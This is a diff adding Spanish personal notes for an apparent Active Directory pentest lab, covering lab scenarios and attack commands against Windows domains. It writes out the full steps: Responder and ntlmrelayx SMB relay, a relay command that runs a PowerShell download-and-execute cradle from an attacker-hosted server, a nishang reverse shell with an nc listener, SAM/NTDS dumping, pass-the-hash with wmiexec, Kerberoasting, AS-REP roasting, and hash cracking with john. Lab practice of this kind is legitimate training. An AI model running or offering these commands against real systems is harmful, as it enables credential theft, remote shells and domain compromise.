@@ -1,0 +1,134 @@
+I1 - Hydra ssh - Configurado
+I2 - Hydra smb y esteganografía - Configurado
+I3 - Hydra SMB/FTP y ssh con id_rsa con/sin password - Configurado
+I4 - Hydra SMB y winrm - Configurado
+I5 - SMB Relay - Configurado - HACER CON TASKS
+I6 - FTP anonymous - Configurado
+I7 - FTP + id_rsa + local ftp anonymous- Configurado
+I8 - SNMP - No Configurado, como pongo el user en ep.ps1????
+
+IX - SNMP(snmpwalk)
+
+
+
+EP1 - nc.exe - Configurado
+EP2 - cmstp.exe - Configurado
+EP3 - wuauclt.exe - Configurado
+EP4 - msiexec.exe - Configurado
+EP5 - SeBackupPrivilege(reg.exe) - Configurado
+EP6 - tttracer.exe - Configurado
+EP7 - rundll32.exe - Configurado
+EP8 - Mimikatz - No Configurado, no puedo ejecutar cmdkeys de forma remota 
+EP09 - start menu(Modificar archivo) - Configurado
+EP10 - start menu(Crear ps1 en el path) - Configurado
+
+AD01 - smb relay + john - Configurado
+AD02 - pass the hash - Configurado
+
+
+AD: 
+
+AD01: smb relay + john:
+    -Configuracion:
+        - activar comandos smb en enterprise
+        - ls \\share\\saf lo tiene k hacer el admin del AD, ¿desde DC?
+        - Habilitar rdesktop
+    -Comandos:
+        - nano /etc/responder/responder.conf -> Smb y http a Off
+        - crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt
+        - sudo responder -I vboxnet0 -dw
+        - ntlmrelayx.py -tf ips.txt -smb2support
+        - y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
+        - john -w pass.txt 192.168.56.253_samhashes.sam --format=NT
+        - john 192.168.56.253_samhashes.sam --format=NT --show
+
+AD02: smb relay + ntlmrelayx.py:(pass the hash)
+    -Configuracion:
+        - activar comandos smb en enterprise
+        - ls \\share\\saf lo tiene k hacer el admin del AD, ¿desde DC?
+        - la pass del usuario random
+    -Comandos:
+        - nano /etc/responder/responder.conf -> Smb y http a Off
+        - Hacer pasos AD01 pero como no consigo pass, hacer esto.
+        - crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt
+        - sudo responder -I vboxnet0 -dw
+        - ntlmrelayx.py -tf ips.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/PS.ps1')"
+        - python3 -m http.server
+        - nc -lvp PORT o rlwrap nc -lvp PORT, el puerto tiene que ser igual que el comando del archivo de nishang
+        - Descargar nishang: git clone https://github.com/samratashok/nishang.git
+        - ./nishang/Shells/Invoke-PowerShellTcp.ps1 .PS.ps1
+        - y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
+        - Estoy dentro 
+
+
+
+Video s4vitar:
+
+Posibles vulnerabilidades:
+Poner en la descripcion dek usuario: Contraseña temporal : contraseña y hacer cambiar de usuario asi, a uno con prics admin???
+get-adUser -Identity user -Properties Description/*
+
+
+Comandos:
+Añadir al /etc/hosts:
+IP  genwin genwin.local DC-Company
+
+Validar credenciales : crackmapexec smb 192.168.56.0/24 -u "user" -p "pass*"
+
+Dumpear SAM del DC cuando tienen credenciales administrador:
+crackmapexec smb IP-DC -u "user" -p "pass" --ntds vss
+
+Pass the hash ejemplo:
+wmiexec.py user@IP -hashes hash (ej -> aad3b435b51404eeaad3b435b51404ee:653958e1e70c5e2f1e9e7745cd33561e)
+
+rpcclient -U "" IP -N -> enumdomusers -> Si esta en Null Session habilitado
+
+Enumerar usuarios del AD con cualquier credencial valida de dominio:, puedo tener credenciales de un usuario sin poder conectarse de forma remota y de esta
+forma conseguir las credenciales de un usuario que se pueda conectar de forma remota.
+rpcclient -U "domain\user%pass" IP -c enumdomusers 
+or
+rpcclient -U "domain\user%pass" IP y se ponen luego los comandos 
++
+rpcclient -U "genwin.local\d.delbarrio%daniel" 192.168.56.252 -c "queryuser 0x44f" -> Para obtener descripcion? Mirar en video, min 56 el bucle 
+
+
+Obtener mucha info con credenciales validas:
+ldapdomaindump -u "genwin.local\d.delbarrio" -p "daniel" 192.168.56.252
++
+python3 -m http.server 
+
+
+
+Kerberos:
+Usuario kerberoasteable:1:03:00
+Configurar:setspn -a genwin.local/user.DC-Company genwin.local\user
+Ahora con cualquier credencial:
+GetUserSPNs.pygenwin.local/user:pass
+GetUserSPNs.pygenwin.local/user:pass -request -> sale el hash TGS del usuario, este hash se puede romper con john 
+
+
+ASRPtoast:
+Si el AD tiene el Null session habilitado:1:06:58
+GetNpUser.py genwin.local/ -mo-pass -usersfile users.txt -> enumerar usuarios con rpcclient?
+Como configurar usuarios?? 
+En el DC, ir al usuario -> cuenta -> No pedir autenticacion kerberos previa
+El hash se puede romper.
+
+
+Golden ticket attack:1:09:00
+
+Persistencia, sin passwords:1:17:32
+
+Rubeus:1:20:28
+    - ASRProast
+    - Kerberos
+ 
+
+file.scf malicioso par aobtener hash NTLv2: 1:24:00
+
+Bloodhound:1:28:00
+
+Links:
+https://es.linkedin.com/pulse/hashes-netntlm-t%C3%A9cnicas-de-relay-y-contramedidas-lacasa-s%C3%A1nchez
+    
+
